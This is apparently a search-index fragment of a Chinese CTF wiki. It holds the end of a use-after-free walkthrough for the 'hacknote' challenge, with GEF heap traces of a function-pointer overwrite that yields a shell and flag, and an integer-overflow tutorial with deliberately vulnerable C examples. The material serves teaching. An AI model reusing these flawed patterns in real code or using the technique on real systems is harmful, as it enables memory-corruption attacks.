\u5f53delete\u7ed3\u675f\u540e\uff0c\u6211\u4eec\u89c2\u770b\u4e00\u4e0bbins\uff0c\u53ef\u4ee5\u53d1\u73b0\uff0c\u786e\u5b9e\u5176\u88ab\u5b58\u653e\u5728\u5bf9\u5e94\u7684fast bin\u4e2d\uff0c gef \u27a4 heap bins \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500 [ Fastbins for arena 0xf7fac780 ] \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500 Fastbins [ idx = 0 , size = 0x8 ] \u2190 UsedChunk ( addr = 0x804b008 , size = 0x10 ) Fastbins [ idx = 1 , size = 0xc ] 0x00 Fastbins [ idx = 2 , size = 0x10 ] 0x00 Fastbins [ idx = 3 , size = 0x14 ] \u2190 UsedChunk ( addr = 0x804b018 , size = 0x28 ) Fastbins [ idx = 4 , size = 0x18 ] 0x00 Fastbins [ idx = 5 , size = 0x1c ] 0x00 Fastbins [ idx = 6 , size = 0x20 ] 0x00 \u5f53\u6211\u4eec\u5c06note1\u4e5f\u5168\u90e8\u5220\u9664\u5b8c\u6bd5\u540e\uff0c\u518d\u6b21\u89c2\u770bbins\u3002\u53ef\u4ee5\u770b\u51fa\uff0c\u540e\u5220\u9664\u7684chunk\u5757\u786e\u5b9e\u5904\u4e8e\u8868\u5934\u3002 gef \u27a4 heap bins \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500[ Fastbins for arena 0xf7fac780 ] \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500 Fastbins [ idx = 0 , size = 0x8 ] \u2190 UsedChunk ( addr = 0x804b040 , size = 0x10 ) \u2190 UsedChunk ( addr = 0x804b008 , size = 0x10 ) Fastbins [ idx = 1 , size = 0xc ] 0x00 Fastbins [ idx = 2 , size = 0x10 ] 0x00 Fastbins [ idx = 3 , size = 0x14 ] \u2190 UsedChunk ( addr = 0x804b050 , size = 0x28 ) \u2190 UsedChunk ( addr = 0x804b018 , size = 0x28 ) Fastbins [ idx = 4 , size = 0x18 ] 0x00 Fastbins [ idx = 5 , size = 0x1c ] 0x00 Fastbins [ idx = 6 , size = 0x20 ] 0x00 \u90a3\u4e48\uff0c\u6b64\u65f6\u5373\u5c06\u8981\u7533\u8bf7note2\uff0c\u6211\u4eec\u53ef\u4ee5\u770b\u4e0bnote2\u90fd\u7533\u8bf7\u5230\u4e86\u4ec0\u4e48\u5185\u5b58\u5757\uff0c\u5982\u4e0b \u7533\u8bf7note2\u5bf9\u5e94\u7684\u5185\u5b58\u5757\u4e3a0x804b040\uff0c\u5176\u5b9e\u5c31\u662fnote1\u5bf9\u5e94\u7684\u5185\u5b58\u5730\u5740\u3002 [+] Heap-Analysis - malloc ( 8 ) = 0x804b040 [+] Heap-Analysis - malloc ( 8 ) = 0x804b040 0 x080486cf in add_note () \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500[ registers ] \u2500\u2500\u2500\u2500 $eax : 0x0804b040 \u2192 0x0804b000 \u2192 0x00000000 $ebx : 0x00000000 $ecx : 0xf7fac780 \u2192 0x00000000 $edx : 0x0804b040 \u2192 0x0804b000 \u2192 0x00000000 $esp : 0xffffcf10 \u2192 0x00000008 $ebp : 0xffffcf48 \u2192 0xffffcf68 \u2192 0x00000000 $esi : 0xf7fac000 \u2192 0x001b1db0 $edi : 0xf7fac000 \u2192 0x001b1db0 $eip : 0x080486cf \u2192 < add_note + 89 > add esp , 0x10 $cs : 0x00000023 $ss : 0x0000002b $ds : 0x0000002b $es : 0x0000002b $fs : 0x00000000 $gs : 0x00000063 $eflags: [ carry PARITY adjust ZERO sign trap INTERRUPT direction overflow resume virtualx86 identification ] \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500[ code: i386 ] \u2500\u2500\u2500\u2500 0 x80486c2 < add_note + 76 > add DWORD PTR [ eax ], eax 0 x80486c4 < add_note + 78 > add BYTE PTR [ ebx + 0x86a0cec ], al 0 x80486ca < add_note + 84 > call 0x80484e0 < malloc@plt > \u2192 0 x80486cf < add_note + 89 > add esp , 0x10 \u7533\u8bf7note2\u7684content\u7684\u5185\u5b58\u5730\u5740\u4e3a0x804b008\uff0c\u5c31\u662fnote0\u5bf9\u5e94\u7684\u5730\u5740\uff0c\u5373\u6b64\u65f6\u6211\u4eec\u5411note2\u7684content\u5199\u5185\u5bb9\uff0c\u5c31\u4f1a\u5c06note0\u7684put\u5b57\u6bb5\u8986\u76d6\u3002 gef \u27a4 n 1 [+] Heap-Analysis - malloc ( 8 ) = 0x804b008 [+] Heap-Analysis - malloc ( 8 ) = 0x804b008 0 x08048761 in add_note () \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500[ registers ] \u2500\u2500\u2500\u2500 $eax : 0x0804b008 \u2192 0x00000000 $ebx : 0x0804b040 \u2192 0x0804865b \u2192 < print_note_content + 0 > push ebp $ecx : 0xf7fac780 \u2192 0x00000000 $edx : 0x0804b008 \u2192 0x00000000 $esp : 0xffffcf10 \u2192 0x00000008 $ebp : 0xffffcf48 \u2192 0xffffcf68 \u2192 0x00000000 $esi : 0xf7fac000 \u2192 0x001b1db0 $edi : 0xf7fac000 \u2192 0x001b1db0 $eip : 0x08048761 \u2192 < add_note + 235 > add esp , 0x10 $cs : 0x00000023 $ss : 0x0000002b $ds : 0x0000002b $es : 0x0000002b $fs : 0x00000000 $gs : 0x00000063 $eflags: [ carry PARITY adjust ZERO sign trap INTERRUPT direction overflow resume virtualx86 identification ] \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500[ code: i386 ] \u2500\u2500\u2500\u2500 0 x8048752 < add_note + 220 > mov al , ds : 0x458b0804 0 x8048757 < add_note + 225 > call 0x581173df 0 x804875c < add_note + 230 > call 0x80484e0 < malloc@plt > \u2192 0 x8048761 < add_note + 235 > add esp , 0x10 \u6211\u4eec\u6765\u5177\u4f53\u68c0\u9a8c\u4e00\u4e0b\uff0c\u770b\u4e00\u4e0b\u8986\u76d6\u524d\u7684\u60c5\u51b5\uff0c\u53ef\u4ee5\u770b\u5230\u8be5\u5185\u5b58\u5757\u7684put\u6307\u9488\u5df2\u7ecf\u88ab\u7f6e\u4e3aNULL\u4e86\uff0c\u8fd9\u662f\u7531fastbin\u7684free\u673a\u5236\u51b3\u5b9a\u7684\u3002 gef \u27a4 x / 2 xw 0x804b008 0 x804b008: 0 x00000000 0x0804b018 \u8986\u76d6\u540e\uff0c\u5177\u4f53\u7684\u503c\u5982\u4e0b gef \u27a4 x / 2 xw 0x804b008 0 x804b008: 0 x08048986 0x0804b00a gef \u27a4 x / i 0x08048986 0 x8048986 < magic > : push ebp \u53ef\u4ee5\u770b\u51fa\uff0c\u786e\u5b9e\u5df2\u7ecf\u88ab\u8986\u76d6\u4e3a\u6211\u4eec\u6240\u60f3\u8981\u7684magic\u51fd\u6570\u4e86\u3002 \u6700\u540e\u6267\u884c\u7684\u6548\u679c\u5982\u4e0b [ + ] Starting local process './hacknote' : pid 35030 [ * ] Switching to interactive mode flag { use_after_free } ---------------------- HackNote ---------------------- 1 . Add note 2 . Delete note 3 . Print note 4 . Exit ---------------------- \u540c\u65f6\uff0c\u6211\u4eec\u8fd8\u53ef\u4ee5\u501f\u52a9gef\u7684heap-analysis-helper \u6765\u770b\u4e00\u4e0b\u6574\u4f53\u7684\u5806\u7684\u7533\u8bf7\u4e0e\u91ca\u653e\u7684\u60c5\u51b5\uff0c\u5982\u4e0b gef \u27a4 heap-analysis-helper [*] This feature is under development , expect bugs and unstability... [+] Tracking malloc () [+] Tracking free () [+] Tracking realloc () [+] Disabling hardware watchpoints ( this may increase the latency ) [+] Dynamic breakpoints correctly setup , GEF will break execution if a possible vulnerabity is found. [*] Note: The heap analysis slows down noticeably the execution. gef \u27a4 c Continuing. [+] Heap-Analysis - malloc ( 8 ) = 0x804b008 [+] Heap-Analysis - malloc ( 8 ) = 0x804b008 [+] Heap-Analysis - malloc ( 32 ) = 0x804b018 [+] Heap-Analysis - malloc ( 8 ) = 0x804b040 [+] Heap-Analysis - malloc ( 32 ) = 0x804b050 [+] Heap-Analysis - free ( 0x804b018 ) [+] Heap-Analysis - watching 0x804b018 [+] Heap-Analysis - free ( 0x804b008 ) [+] Heap-Analysis - watching 0x804b008 [+] Heap-Analysis - free ( 0x804b050 ) [+] Heap-Analysis - watching 0x804b050 [+] Heap-Analysis - free ( 0x804b040 ) [+] Heap-Analysis - watching 0x804b040 [+] Heap-Analysis - malloc ( 8 ) = 0x804b040 [+] Heap-Analysis - malloc ( 8 ) = 0x804b008 [+] Heap-Analysis - Cleaning up [+] Heap-Analysis - Re-enabling hardware watchpoints [ New process 36248 ] process 36248 is executing new program : / bin / dash [ New process 36249 ] process 36249 is executing new program : / bin / cat [ Inferior 3 ( process 36249 ) exited normally ] \u8fd9\u91cc\u7b2c\u4e00\u4e2a\u8f93\u51fa\u4e86\u4e24\u6b21\uff0c\u5e94\u8be5\u662fgef\u5de5\u5177\u7684\u95ee\u9898\u3002","title":"\u5229\u7528\u811a\u672c"},{"location":"pwn/heap/use_after_free/#_6","text":"2016 HCTF fheap","title":"\u9898\u76ee"},{"location":"pwn/integeroverflow/intof/","text":"\u6574\u6570\u6ea2\u51fa \u00b6 \u4ecb\u7ecd \u00b6 \u5728C\u8bed\u8a00\u4e2d\uff0c\u6574\u6570\u7684\u57fa\u672c\u6570\u636e\u7c7b\u578b\u5206\u4e3a\u77ed\u6574\u578b(short)\uff0c\u6574\u578b(int)\uff0c\u957f\u6574\u578b(long)\uff0c\u8fd9\u4e09\u4e2a\u6570\u636e\u7c7b\u578b\u8fd8\u5206\u4e3a\u6709\u7b26\u53f7\u548c\u65e0\u7b26\u53f7\uff0c\u6bcf\u79cd\u6570\u636e\u7c7b\u578b\u90fd\u6709\u5404\u81ea\u7684\u5927\u5c0f\u8303\u56f4\uff0c(\u56e0\u4e3a\u6570\u636e\u7c7b\u578b\u7684\u5927\u5c0f\u8303\u56f4\u662f\u7f16\u8bd1\u5668\u51b3\u5b9a\u7684\uff0c\u6240\u4ee5\u4e4b\u540e\u6240\u8ff0\u90fd\u9ed8\u8ba4\u662f 64 \u4f4d\u4e0b\u4f7f\u7528 gcc-5.4)\uff0c\u5982\u4e0b\u6240\u793a: \u7c7b\u578b \u5b57\u8282 \u8303\u56f4 short int 2byte(word) 0~32767(0~0x7fff) -32768~-1(0x8000~0xffff) unsigned short int 2byte(word) 0~65535(0~0xffff) int 4byte(dword) 0~2147483647(0~0x7fffffff) -2147483648~-1(0x80000000~0xffffffff) unsigned int 4byte(dword) 0~4294967295(0~0xffffffff) long int 8byte(qword) \u6b63: 0~0x7fffffffffffffff \u8d1f:0x8000000000000000~0xffffffffffffffff unsigned long int 8byte(qword) 0~0xffffffffffffffff \u5f53\u7a0b\u5e8f\u4e2d\u7684\u6570\u636e\u8d85\u8fc7\u5176\u6570\u636e\u7c7b\u578b\u7684\u8303\u56f4\uff0c\u5219\u4f1a\u9020\u6210\u6ea2\u51fa\uff0c\u6574\u6570\u7c7b\u578b\u7684\u6ea2\u51fa\u88ab\u79f0\u4e3a\u6574\u6570\u6ea2\u51fa\u3002 \u539f\u7406 \u00b6 \u63a5\u4e0b\u6765\u7b80\u5355\u9610\u8ff0\u4e0b\u6574\u6570\u6ea2\u51fa\u7684\u539f\u7406 \u4e0a\u754c\u6ea2\u51fa \u00b6 # \u4f2a\u4ee3\u7801 short int a; a = a + 1; # \u5bf9\u5e94\u7684\u6c47\u7f16 movzx eax, word ptr [rbp - 0x1c] add eax, 1 mov word ptr [rbp - 0x1c], ax unsigned short int b; b = b + 1; # assembly code add word ptr [rbp - 0x1a], 1 \u4e0a\u754c\u6ea2\u51fa\u6709\u4e24\u79cd\u60c5\u51b5\uff0c\u4e00\u79cd\u662f 0x7fff + 1 \uff0c \u53e6\u4e00\u79cd\u662f 0xffff + 1 \u3002 \u56e0\u4e3a\u8ba1\u7b97\u673a\u5e95\u5c42\u6307\u4ee4\u662f\u4e0d\u533a\u5206\u6709\u7b26\u53f7\u548c\u65e0\u7b26\u53f7\u7684\uff0c\u6570\u636e\u90fd\u662f\u4ee5\u4e8c\u8fdb\u5236\u5f62\u5f0f\u5b58\u5728(\u7f16\u8bd1\u5668\u7684\u5c42\u9762\u624d\u5bf9\u6709\u7b26\u53f7\u548c\u65e0\u7b26\u53f7\u8fdb\u884c\u533a\u5206\uff0c\u4ea7\u751f\u4e0d\u540c\u7684\u6c47\u7f16\u6307\u4ee4)\u3002 \u6240\u4ee5 add 0x7fff, 1 == 0x8000 \uff0c\u8fd9\u79cd\u4e0a\u754c\u6ea2\u51fa\u5bf9\u65e0\u7b26\u53f7\u6574\u578b\u5c31\u6ca1\u6709\u5f71\u54cd\uff0c\u4f46\u662f\u5728\u6709\u7b26\u53f7\u77ed\u6574\u578b\u4e2d\uff0c 0x7fff \u8868\u793a\u7684\u662f 32767 \uff0c\u4f46\u662f 0x8000 \u8868\u793a\u7684\u662f -32768 \uff0c\u7528\u6570\u5b66\u8868\u8fbe\u5f0f\u6765\u8868\u793a\u5c31\u662f\u5728\u6709\u7b26\u53f7\u77ed\u6574\u578b\u4e2d 32767+1 == -32768 \u3002 \u7b2c\u4e8c\u79cd\u60c5\u51b5\u662f add 0xffff, 1 \uff0c\u8fd9\u79cd\u60c5\u51b5\u9700\u8981\u8003\u8651\u7684\u662f\u7b2c\u4e00\u4e2a\u64cd\u4f5c\u6570\u3002 \u6bd4\u5982\u4e0a\u9762\u7684\u6709\u7b26\u53f7\u578b\u52a0\u6cd5\u7684\u6c47\u7f16\u4ee3\u7801\u662f add eax, 1 \uff0c\u56e0\u4e3a eax=0xffff \uff0c\u6240\u4ee5 add eax, 1 == 0x10000 \uff0c\u4f46\u662f\u65e0\u7b26\u53f7\u7684\u6c47\u7f16\u4ee3\u7801\u662f\u5bf9\u5185\u5b58\u8fdb\u884c\u52a0\u6cd5\u8fd0\u7b97 add word ptr [rbp - 0x1a], 1 == 0x0000 \u3002 \u5728\u6709\u7b26\u53f7\u7684\u52a0\u6cd5\u4e2d\uff0c\u867d\u7136 eax \u7684\u7ed3\u679c\u4e3a 0x10000\uff0c\u4f46\u662f\u53ea\u628a ax=0x0000 \u7684\u503c\u50a8\u5b58\u5230\u4e86\u5185\u5b58\u4e2d\uff0c\u4ece\u7ed3\u679c\u770b\u548c\u65e0\u7b26\u53f7\u662f\u4e00\u6837\u7684\u3002 \u518d\u4ece\u6570\u5b57\u5c42\u9762\u770b\u770b\u8fd9\u79cd\u6ea2\u51fa\u7684\u7ed3\u679c\uff0c\u5728\u6709\u7b26\u53f7\u77ed\u6574\u578b\u4e2d\uff0c 0xffff==-1\uff0c-1 + 1 == 0 \uff0c\u4ece\u6709\u7b26\u53f7\u770b\u8fd9\u79cd\u8ba1\u7b97\u6ca1\u95ee\u9898\u3002 \u4f46\u662f\u5728\u65e0\u7b26\u53f7\u77ed\u6574\u578b\u4e2d\uff0c 0xffff == 65535, 65535 + 1 == 0 \u3002 \u4e0b\u754c\u6ea2\u51fa \u00b6 \u4e0b\u5c4a\u6ea2\u51fa\u7684\u9053\u7406\u548c\u4e0a\u754c\u6ea2\u51fa\u4e00\u6837\uff0c\u5728\u6c47\u7f16\u4ee3\u7801\u4e2d\uff0c\u53ea\u662f\u628a add \u66ff\u6362\u6210\u4e86 sub \u3002 \u4e00\u6837\u4e5f\u662f\u6709\u4e24\u79cd\u60c5\u51b5\uff1a \u7b2c\u4e00\u79cd\u662f sub 0x0000, 1 == 0xffff \uff0c\u5bf9\u4e8e\u6709\u7b26\u53f7\u6765\u8bf4 0 - 1 == -1 \u6ca1\u95ee\u9898\uff0c\u4f46\u662f\u5bf9\u4e8e\u65e0\u7b26\u53f7\u6765\u8bf4\u5c31\u6210\u4e86 0 - 1 == 65535 \u3002 \u7b2c\u4e8c\u79cd\u662f sub 0x8000, 1 == 0x7fff \uff0c\u5bf9\u4e8e\u65e0\u7b26\u53f7\u6765\u8bf4\u662f 32768 - 1 == 32767 \u662f\u6b63\u786e\u7684\uff0c\u4f46\u662f\u5bf9\u4e8e\u6709\u7b26\u53f7\u6765\u8bf4\u5c31\u53d8\u6210\u4e86 -32768 - 1 = 32767 \u3002 \u4f8b\u5b50 \u00b6 \u5728\u6211\u89c1\u8fc7\u7684\u6574\u6570\u6ea2\u51fa\u7684\u6f0f\u6d1e\u4e2d\uff0c\u6211\u8ba4\u4e3a\u53ef\u4ee5\u603b\u7ed3\u4e3a\u4e24\u79cd\u60c5\u51b5\u3002 \u672a\u9650\u5236\u8303\u56f4 \u00b6 \u8fd9\u79cd\u60c5\u51b5\u5f88\u597d\u7406\u89e3\uff0c\u6bd4\u5982\u6709\u4e00\u4e2a\u56fa\u5b9a\u5927\u5c0f\u7684\u6876\uff0c\u5f80\u91cc\u9762\u5012\u6c34\uff0c\u5982\u679c\u4f60\u6ca1\u6709\u9650\u5236\u5012\u5165\u591a\u5c11\u6c34\uff0c\u90a3\u4e48\u6c34\u5219\u4f1a\u4ece\u6876\u4e2d\u6ea2\u51fa\u6765\u3002 \u4e00\u4e2a\u6709\u56fa\u5b9a\u5927\u5c0f\u7684\u4e1c\u897f\uff0c\u4f60\u6ca1\u6709\u5bf9\u5176\u8fdb\u884c\u7ea6\u675f\uff0c\u5c31\u4f1a\u9020\u6210\u4e0d\u53ef\u9884\u671f\u7684\u540e\u679c\u3002 \u7b80\u5355\u7684\u5199\u4e00\u4e2a\u793a\u4f8b: $ cat test . c #include <stddef.h> int main ( void ) { int len ; int data_len ; int header_len ; char * buf ; header_len = 0x10 ; scanf ( \"%uld\" , & data_len ); len = data_len + header_len buf = malloc ( len ); read ( 0 , buf , data_len ); return 0 ; } $ gcc test . c $ . / a . out - 1 asdfasfasdfasdfafasfasfasdfasdf # gdb a.out \u25ba 0x40066d < main + 71 > call malloc @ plt < 0x400500 > size : 0xf \u53ea\u7533\u8bf7 0x20 \u5927\u5c0f\u7684\u5806\uff0c\u4f46\u662f\u5374\u80fd\u8f93\u5165 0xffffffff \u957f\u5ea6\u7684\u6570\u636e\uff0c\u4ece\u6574\u578b\u6ea2\u51fa\u5230\u5806\u6ea2\u51fa \u9519\u8bef\u7684\u7c7b\u578b\u8f6c\u6362 \u00b6 \u5373\u4f7f\u6b63\u786e\u7684\u5bf9\u53d8\u91cf\u8fdb\u884c\u7ea6\u675f\uff0c\u4e5f\u4ecd\u7136\u6709\u53ef\u80fd\u51fa\u73b0\u6574\u6570\u6ea2\u51fa\u6f0f\u6d1e\uff0c\u6211\u8ba4\u4e3a\u53ef\u4ee5\u6982\u62ec\u4e3a\u9519\u8bef\u7684\u7c7b\u578b\u8f6c\u6362\uff0c\u5982\u679c\u7ee7\u7eed\u7ec6\u5206\u4e0b\u53bb\uff0c\u53ef\u4ee5\u5206\u4e3a\uff1a \u8303\u56f4\u5927\u7684\u53d8\u91cf\u8d4b\u503c\u7ed9\u8303\u56f4\u5c0f\u7684\u53d8\u91cf $ cat test2 . c void check ( int n ) { if ( ! n ) printf ( \"vuln\" ); else printf ( \"OK\" ); } int main ( void ) { long int a ; scanf ( \"%ld\" , & a ); if ( a == 0 ) printf ( \"Bad\" ); else check ( a ); return 0 ; } $ gcc test2 . c $ . / a . out 4294967296 vuln \u4e0a\u8ff0\u4ee3\u7801\u5c31\u662f\u4e00\u4e2a\u8303\u56f4\u5927\u7684\u53d8\u91cf(\u957f\u6574\u578ba)\uff0c\u4f20\u5165 check \u51fd\u6570\u540e\u53d8\u4e3a\u8303\u56f4\u5c0f\u7684\u53d8\u91cf(\u6574\u578b\u53d8\u91cfn)\uff0c\u9020\u6210\u6574\u6570\u6ea2\u51fa\u7684\u4f8b\u5b50\u3002 \u5df2\u7ecf\u957f\u6574\u578b\u7684\u5360\u6709 8 byte \u7684\u5185\u5b58\u7a7a\u95f4\uff0c\u800c\u6574\u578b\u53ea\u6709 4 byte \u7684\u5185\u5b58\u7a7a\u95f4\uff0c\u6240\u4ee5\u5f53 long -> int\uff0c\u5c06\u4f1a\u9020\u6210\u622a\u65ad\uff0c\u53ea\u628a\u957f\u6574\u578b\u7684\u4f4e 4byte \u7684\u503c\u4f20\u7ed9\u6574\u578b\u53d8\u91cf\u3002 \u5728\u4e0a\u8ff0\u4f8b\u5b50\u4e2d\uff0c\u5c31\u662f\u628a long: 0x100000000 -> int: 0x00000000 \u3002 \u4f46\u662f\u5f53\u8303\u56f4\u66f4\u5c0f\u7684\u53d8\u91cf\u5c31\u80fd\u5b8c\u5168\u7684\u628a\u503c\u4f20\u9012\u7ed9\u8303\u56f4\u66f4\u5927\u7684\u53d8\u91cf\uff0c\u800c\u4e0d\u4f1a\u9020\u6210\u6570\u636e\u4e22\u5931\u3002 \u53ea\u505a\u4e86\u5355\u8fb9\u9650\u5236 \u8fd9\u79cd\u60c5\u51b5\u53ea\u9488\u5bf9\u6709\u7b26\u53f7\u7c7b\u578b $ cat test3 . c int main ( void ) { int len , l ; char buf [ 11 ]; scanf ( \"%d\" , & len ); if ( len < 10 ) { l = read ( 0 , buf , len ); * ( buf + l ) = 0 ; puts ( buf ); } else printf ( \"Please len < 10\" ); } $ gcc test3 . c $ . / a . out - 1 aaaaaaaaaaaa aaaaaaaaaaaa \u4ece\u8868\u9762\u4e0a\u770b\uff0c\u6211\u4eec\u5bf9\u53d8\u91cf len \u8fdb\u884c\u4e86\u9650\u5236\uff0c\u4f46\u662f\u4ed4\u7ec6\u601d\u8003\u53ef\u4ee5\u53d1\u73b0\uff0clen \u662f\u6709\u7b26\u53f7\u6574\u578b\uff0c\u6240\u4ee5 len \u7684\u957f\u5ea6\u53ef\u4ee5\u4e3a\u8d1f\u6570\uff0c\u4f46\u662f\u5728 read \u51fd\u6570\u4e2d\uff0c\u7b2c\u4e09\u4e2a\u53c2\u6570\u7684\u7c7b\u578b\u662f size_t \uff0c\u8be5\u7c7b\u578b\u76f8\u5f53\u4e8e unsigned long int \uff0c\u5c5e\u4e8e\u65e0\u7b26\u53f7\u957f\u6574\u578b \u4e0a\u9762\u4e3e\u4f8b\u7684\u4e24\u79cd\u60c5\u51b5\u90fd\u6709\u4e00\u4e2a\u5171\u6027\uff0c\u5c31\u662f\u51fd\u6570\u7684\u5f62\u53c2\u548c\u5b9e\u53c2\u7684\u7c7b\u578b\u4e0d\u540c\uff0c\u6240\u4ee5\u6211\u8ba4\u4e3a\u53ef\u4ee5\u603b\u7ed3\u4e3a\u9519\u8bef\u7684\u7c7b\u578b\u8f6c\u6362 CTF\u4f8b\u9898 \u00b6 \u9898\u76ee\uff1a Pwnhub \u6545\u4e8b\u7684\u5f00\u59cb calc","title":"\u6574\u6570\u6ea2\u51fa\u539f\u7406\u4ecb\u7ecd"},{"location":"pwn/integeroverflow/intof/#_1","text":"","title":"\u6574\u6570\u6ea2\u51fa"},{"location":"pwn/integeroverflow/intof/#_2","text":"\u5728C\u8bed\u8a00\u4e2d\uff0c\u6574\u6570\u7684\u57fa\u672c\u6570\u636e\u7c7b\u578b\u5206\u4e3a\u77ed\u6574\u578b(short)\uff0c\u6574\u578b(int)\uff0c\u957f\u6574\u578b(long)\uff0c\u8fd9\u4e09\u4e2a\u6570\u636e\u7c7b\u578b\u8fd8\u5206\u4e3a\u6709\u7b26\u53f7\u548c\u65e0\u7b26\u53f7\uff0c\u6bcf\u79cd\u6570\u636e\u7c7b\u578b\u90fd\u6709\u5404\u81ea\u7684\u5927\u5c0f\u8303\u56f4\uff0c(\u56e0\u4e3a\u6570\u636e\u7c7b\u578b\u7684\u5927\u5c0f\u8303\u56f4\u662f\u7f16\u8bd1\u5668\u51b3\u5b9a\u7684\uff0c\u6240\u4ee5\u4e4b\u540e\u6240\u8ff0\u90fd\u9ed8\u8ba4\u662f 64 \u4f4d\u4e0b\u4f7f\u7528 gcc-5.4)\uff0c\u5982\u4e0b\u6240\u793a: \u7c7b\u578b \u5b57\u8282 \u8303\u56f4 short int 2byte(word) 0~32767(0~0x7fff) -32768~-1(0x8000~0xffff) unsigned short int 2byte(word) 0~65535(0~0xffff) int 4byte(dword) 0~2147483647(0~0x7fffffff) -2147483648~-1(0x80000000~0xffffffff) unsigned int 